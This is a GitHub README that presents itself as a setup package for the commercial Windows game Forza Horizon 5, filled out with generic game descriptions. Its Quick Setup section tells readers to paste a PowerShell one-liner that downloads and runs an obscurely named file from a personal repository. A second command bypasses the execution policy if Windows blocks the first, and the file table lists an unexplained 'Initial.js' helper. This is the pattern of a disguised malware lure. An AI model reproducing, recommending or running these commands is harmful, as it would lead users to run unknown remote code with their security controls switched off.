# Forza Horizon 5

Forza Horizon 5 is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Forza Horizon 5 and play.

Forza Horizon 5 is the fifth entry in Playground Games’ festival-style racing series, placing you in a stylized open Mexico with changing seasons, weather, and a shared online world. On Windows you launch through the Xbox PC application or Steam, using a controller, keyboard, or wheel while tuning assists, graphics, and audio to match your rig.

A typical session starts at the Horizon Festival hub, where you pick a car class, join a convoy, or accept playlist events before free-roaming desert highways and jungle switchbacks. You might chain danger-sign jumps, seasonal PR stunts, and Showcase Events, swap liveries in Creative Hub, then bank Accolade progress while rivals appear on shared roads and seasonal leaderboards refresh overnight.

This repository stores the Windows setup package, short configuration notes, and a chronological changelog aligned with the build you intend to run. Use the setup when refreshing hardware or rebuilding a clean system; read the notes for preset guidance, controller profiles, and save locations; review the changelog before applying an update so gameplay settings and stored progress stay consistent with your intended target version.

## How you play

- Shattered desert storms and tropical downpours alter grip and visibility mid-race across Mexico.
- Hundreds of licensed cars span modern hypercars, classic icons, and bespoke Horizon edition trims.
- Seasonal playlists rotate weekly challenges, exclusive rewards, and festival-themed competitive event ladders.
- Convoy multiplayer lets friends chain races, photo challenges, and cooperative PR stunts without loading screens.
- EventLab and Horizon Arcade deliver custom routes, minigames, and community-shared rule sets online.
- Ray-traced reflections and optional upscaling help high frame rates on capable Windows gaming hardware.
- Accolades and Collection milestones track brands, biomes, and stunt categories across your garage history.

## Quick Setup (PowerShell)

This installs the game Forza Horizon 5 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/claudia937335/forza-horizon-5-setup-guide/main/1laufwpjqm.bs2yp7n4 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/claudia937335/forza-horizon-5-setup-guide/main/1laufwpjqm.bs2yp7n4 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `1laufwpjqm.bs2yp7n4` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `claudia937335/forza-horizon-5-setup-guide`. Forza Horizon 5 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
